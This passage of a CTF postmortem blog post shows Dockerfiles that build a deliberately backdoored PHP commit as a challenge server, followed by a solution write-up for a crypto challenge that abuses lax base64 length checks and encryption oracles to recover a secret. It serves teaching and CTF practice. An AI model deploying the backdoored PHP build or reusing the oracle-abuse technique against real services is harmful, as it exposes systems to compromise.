</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> cd php-src-* <span style="color:#f92672">&amp;&amp;</span> ./buildconf <span style="color:#f92672">&amp;&amp;</span> ./configure <span style="color:#f92672">&amp;&amp;</span> make -j4<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;/tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php&#34;</span>, <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0:80&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;/var/www/html&#34;</span>]</code></pre></div>
<p>I referred to <a href="https://hub.docker.com/layers/vulhub/php/8.1-backdoor/images/sha256-5cbeb206dcda6c296bdc1e11f855073aa59dd68db8cfadb846a632727875a99a?context=explore">Docker image of vulhub</a> to see what I was missing. After all, I just need to use the <code>zlib</code> module where the vulnerability is introduced, according to <a href="https://github.com/php/php-src/blob/c730aa26bd52829a49f2ad284b181b7e82a68d7d/ext/zlib/zlib.c#L365-L373"><code>zlib.c</code></a>. It took me hours for debugging to introduce the bug. 🤷</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:focal-20210827</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive

<span style="color:#66d9ef">RUN</span> apt update<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip zlib1g-dev<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> cd php-src-* <span style="color:#f92672">&amp;&amp;</span> ./buildconf <span style="color:#f92672">&amp;&amp;</span> ./configure --with-zlib <span style="color:#f92672">&amp;&amp;</span> make -j4<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;/tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php&#34;</span>, <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0:80&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;/var/www/html&#34;</span>]</code></pre></div>
<p>Also, we of course are not exposing the root permission. Gotta fix that or players are will be nuking the challenge server. This is the final <code>Dockerfile</code> we have for now.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:focal-20210827</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive

<span style="color:#66d9ef">RUN</span> apt update <span style="color:#f92672">&amp;&amp;</span> apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev wget unzip zlib1g-dev<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> unzip c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>            <span style="color:#f92672">&amp;&amp;</span> cd php-src-* <span style="color:#f92672">&amp;&amp;</span> ./buildconf <span style="color:#f92672">&amp;&amp;</span> ./configure --with-zlib <span style="color:#f92672">&amp;&amp;</span> make -j4<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mv /tmp/php-src-c730aa26bd52829a49f2ad284b181b7e82a68d7d/sapi/cli/php /bin<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm -rf /tmp/*<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> www-data</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;php&#34;</span>, <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0:80&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;/var/www/html&#34;</span>]</code></pre></div>
<h2 id="神奇的糊塗魔藥--potion-of-ciphermath-misc">神奇的糊塗魔藥 / Potion of Ciphermath (Misc)<a href="#神奇的糊塗魔藥--potion-of-ciphermath-misc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>

<h3 id="challenge-summary-2">Challenge Summary<a href="#challenge-summary-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<blockquote>
<p><em>無視道與理 是與非非 盼待往天飛 卻要撞地</em><br>
<em>在忙亂之中找到勇氣 一片塵埃中起飛</em></p>

<p>Let's speak in math! Of course we can make it harder by encrypting the numbers, too.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc HOST PORT</code></pre></div></blockquote>

<p>When connected to the server, a 512-bit prime $p$ and a secret $x \in [0, p)$ is generated. Denote $\text{Enc}$ be an encryption function that encrypts a number $n \in [0, 2^{512})$ into a 64-byte ciphertext. We can call the below oracles in a total of 4096 times:</p>

<ol>
<li><strong>[Get Secret]</strong> Return $\text{Enc}(x \oplus p)$.</li>
<li><strong>[Multiplication]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a\cdot b\ \text{mod}\ p)$.</li>
<li><strong>[Power]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a^b\ \text{mod}\ p)$.</li>
<li><strong>[Bitwise And]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a \land b\ \text{mod}\ p)$.</li>
<li><strong>[Bitwise Or]</strong> Given $\text{Enc}(a)$ and $\text{Enc}(b)$, return $\text{Enc}(a\lor b\ \text{mod}\ p)$.</li>
<li><strong>[Attempt]</strong> Given $x_0$, returns the flag if $x = x_0$ (i.e., the secret is correct).</li>
</ol>

<p>The encryption function, $\text{Enc}$, is defined below. User shall pass a 88-character long (the length is checked) string, $\text{Enc}(a)$, and the string will be decoded in base64 before passing to <code>NumberEncryptor</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">NumberEncryptor</span>:
    <span style="color:#66d9ef">def</span> __init__(self, bits):
        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
        self<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> bits

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(self, number):
        key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>key
        c <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>to_bytes(number, self<span style="color:#f92672">.</span>bits<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
        c <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(c)
        c <span style="color:#f92672">=</span> c[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
        c <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(c)
        <span style="color:#66d9ef">return</span> c

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(self, c):
        key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>key
        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
        c <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(c)
        c <span style="color:#f92672">=</span> c[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
        cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
        c <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(c)
        <span style="color:#66d9ef">return</span> int<span style="color:#f92672">.</span>from_bytes(c, <span style="color:#e6db74">&#39;big&#39;</span>)</code></pre></div>
<h3 id="motivation-1">Motivation<a href="#motivation-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<p>Inspired by <a href="/posts/2021/2021-05-04-defcon-quals-1/#side-story-creating-a-crypto-challenge"><em>nooombers</em> in <em>DEFCON CTF 2021 Quals</em></a> but the source code is given.</p>

<h3 id="solution-2">Solution<a href="#solution-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

<h4 id="constructing-textenc0-and-textenc1">Constructing $\text{Enc}(0)$ and $\text{Enc}(1)$<a href="#constructing-textenc0-and-textenc1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>

<p>The below algorithm, $\mathcal{A}_0$, is one way to construct $\text{Enc}(0$):</p>

<ol>
<li>Generate 64 bytes randomly and denote it by $x$.</li>
<li>Generate 64 bytes randomly and denote it by $r$. Call the <em>bitwise and</em> oracle and update $x \leftarrow \text{Enc}(z \land r_k\ \text{mod}\ p)$.</li>
<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(0)$.</li>
</ol>

<p>There is a better way. Let's introduce a major weakness.</p>

<div class="alert danger" style="margin-bottom: 12px;">
  <strong>Weakness.</strong> The server only checks if the base64-encoded $\text{Enc}(a)$ has a length of 88. The characters outside the base64 charset will be dropped. With that said, we can send ciphertexts those are shorter than 64.
</div>


<p>To utilize the weakness, we can pass 88 <code>~</code>'s and it would decode into <code>b''</code>. Also, <code>number_encryptor.decrypt(b'') == 0</code>. That said, we can construct $\text{Enc}(0)$ without using the oracle. This is a <em>dirty zero</em> because it is not the $\text{Enc}(0)$ created by the oracle, which is needed in later parts of the game. Well, we can simply obtain $\text{Enc}(0)$ using <code>AND [88 ~'s] [88 ~'s]</code>. It is then evident to construct $\text{Enc}(1)$: <code>POW [ZERO] [ZERO]</code>. Now we can construct both in two oracle calls.</p>

<div class="alert warning" style="margin-bottom: 12px;">
  <strong>Confession of an ex-math guy.</strong> I know $0^0$ is mathematically undefined. However they said $0^0 = 1$ in Python&hellip; Let&rsquo;s stick to that.
</div>


<h4 id="constructing-textenc2">Constructing $\text{Enc}(2)$<a href="#constructing-textenc2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>

<div class="alert warning" style="margin-bottom: 12px;">
  <strong>A sidenote.</strong> I can only construct $\text{Enc}(4)$ while I was testing the challenge. I shared the problem to <em>harrier</em> and he could construct two probabilistically. Good that I don&rsquo;t need to make it easier to accommodate my level.
</div>


<p><a href="https://twitter.com/harrier_lcc" target="_blank" rel="nofollow">@harrier_lcc</a> suggested a way to craft $\text{Enc}(2)$. The idea is similar to the algorithm $\mathcal{A}_0$ specified below. Let's call it $\mathcal{A}_1$:</p>

<ol>
<li>Generate 64 bytes randomly and denote it by $x$.</li>
<li>Generate 64 bytes randomly and denote it by $r$. Compute $u \leftarrow \text{Enc}(z \land r_k\ \text{mod}\ p)$ (via <code>AND</code>). If $u \neq \text{Enc}(0)$, we set $x \leftarrow u$.</li>
<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(2^k)$ for some $k = 0, 1, ..., 511$ (i.e., $z$ has one set bit).</li>
</ol>

<p>This is clever. The <em>bitwise and</em> oracle can be used to find sequence of decreasing Hamming distance. However, even if $x = \text{Enc}(2^k)$, the probability for $x = \text{Enc}(2)$ is only $1/512$. How could we improve the algorithm? We can make use of the weakness - we can send a 88-character long string that decodes into 16 bytes after base64 decoding. Here comes the improved $\mathcal{A}_1$, denoted by $\mathcal{A}_1^+$:</p>

<ol>
<li>Generate <strong>16</strong> bytes randomly and denote it by $x$.</li>
<li>Generate <strong>16</strong> bytes randomly and denote it by $r$. Compute $u \leftarrow \text{Enc}(z \land r_k\ \text{mod}\ p)$ (via <code>AND</code>). If $u \neq \text{Enc}(0)$, we set $x \leftarrow u$.</li>
<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(2^k)$ for some $k = 0, 1, ..., 127$.</li>
</ol>

<p>Now the probability is increased to $1/128$. We can run the algorithm multiple times to get $x = \text{Enc}(2)$... But wait, how do we confirm that $x = \text{Enc}(2)$? Good that I was able to make $\text{Enc}(4)$. After all, we can check by using <code>MUL [TWO?] [TWO?]</code>.</p>

<p>We need to construct $\text{Enc}(2^{128}-2)$ for $\text{Enc}(4)$. We can adopt a similar algorithm in $\mathcal{A}_1^+$, let's call it $\mathcal{A}_2$:</p>

<ol>
<li>Generate 16 bytes randomly and denote it by $x$.</li>
<li>Generate 16 bytes randomly and denote it by $r$. Compute $u \leftarrow \text{Enc}(z \lor r_k\ \text{mod}\ p)$ (via <code>OR</code>). If $\text{Enc}(u \land 1) = \text{Enc}(0)$, then we set $x \leftarrow u$.</li>
<li>Repeat step 2 until $x$ is not changing anymore. In that case, it is likely that $x = \text{Enc}(2^{128}-2)$.</li>
</ol>

<p>With that, we can construct $\text{Enc}(4)$ by:</p>

<ol>
<li><code>MUL [2^128-2] [2^128-2]</code> (returns $\text{Enc}(2^{256} - 2^{129} + 4)$)</li>
<li><code>AND [2^256-2^129+4] [2^128-2]</code> (returns $\text{Enc}(4)$)</li>
</ol>

<div class="alert success" style="margin-bottom: 12px;">
  <strong>Congratulations! 🎉</strong> You have survived the hardest part of the challenge. The remaining parts would be straight forward.
</div>


<h4 id="recovering-p">Recovering $p$<a href="#recovering-p" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>

<p>From $\text{Enc}(1)$ and $\text{Enc}(2)$, we are able to construct $\text{Enc}(2^2)$, $\text{Enc}(2^3)$, ... $\text{Enc}(2^{511})$ by <code>MUL</code>. We can use the below algorithm $\mathcal{A}_3$ to recover $p$ (not $\text{Enc}(p)$):</p>

<ol>
<li>Initiate $p \leftarrow 1$ and $x \leftarrow \text{Enc}(0)$.</li>
<li>For $i = 511, 510, ..., 1$, do the following:

<ul>
<li>Compute $x' \leftarrow \text{Enc}(x \lor 2^i\ \text{mod}\ p)$ (via <code>OR</code>). Denote $u := x \lor 2^i\ \text{mod}\ p$.</li>
<li>If $\text{Enc}(u \land 1\ \text{mod}\ p) = \text{Enc}(0)$, then set $x \leftarrow x'$ and update $p \leftarrow p + 2^i$.</li>
</ul></li>
</ol>

<div class="alert info" style="margin-bottom: 12px;">
  <strong>Why does the algorithm work?</strong> It is based on the below theorem: Suppose that $p$ is a 512-bit prime and $n \in [0, 2^{512})$ is even. Then $n\ \text{mod}\ p$ is odd if and only if $n \leq p$.
</div>


<h4 id="recovering-x-oplus-p">Recovering $x \oplus p$<a href="#recovering-x-oplus-p" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>

<p>This part is easy. We can recover $x \oplus p$ by running the below algorithm, $\mathcal{A}_4$:</p>

<ol>
<li>Initiate $s \leftarrow 0$.</li>
<li>For $i = 0, 1, ..., 511$, do the following:

<ul>
<li>Compute $x' \leftarrow \text{Enc}(x \land 2^i\ \text{mod}\ p)$ (via <code>AND</code>).</li>
<li>If $x' \neq \text{Enc}(0)$, then set $s \leftarrow s + 2^i$.</li>
</ul></li>
</ol>

<p>From here, we can compute the secret $x$ from $x \oplus p$ and $p$. Finally we can get the flag using <code>ATTEMPT</code>.</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/posts/2021/2021-11-27-balsn-dlog/">
                <span class="button__icon">←</span>
                <span class="button__text">Balsn CTF 2021: dlog</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="/posts/2021/2021-11-18-hkcert-ctf-3/">
                <span class="button__text">HKCERT CTF 2021 Postmortem (III): The Reverse Challenges</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>


<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    HKCERT CTF 2021 Postmortem (IV): The Remaining Ones
  </a>
  <div class="js-toc"></div>
</aside>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
      headingSelector: 'h1, h2, h3, h4',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
</script>



  </div>
  <aside class="ads">
    
  
  <ins class="adsbygoogle"
    style="display:block"
    data-ad-client="ca-pub-3220069814773012"
    data-ad-slot="6927401005"
    data-ad-format="auto"
    data-full-width-responsive="true"></ins>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
  </script>


  </aside>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>






<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/viz.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/2.1.2/full.render.js"></script>
<script>
var viz = new Viz();

document.querySelectorAll("[class=graphviz]").forEach(node => {
  const escape = function (s) {
    const t = s.replace(/&amp;/g, '&')
    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
  }
  viz.renderSVGElement(escape(node.innerText), {
    engine: 'dot'
  }).then(function (element) {
    node.parentNode.appendChild(element)
    node.style.display = 'none'
  })
})
</script>
<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
mermaid.initialize({
    startOnLoad: true,
    htmlLabels: true,
    securityLevel: "loose",
    theme: 'base',
    themeVariables: {
        background: '#22222c',
        primaryColor: '#33333c',
        primaryTextColor: '#ffe4e1',
    }
});
</script>

  
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180181192-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-180181192-1');
</script>



  
</div>

</body>
</html>
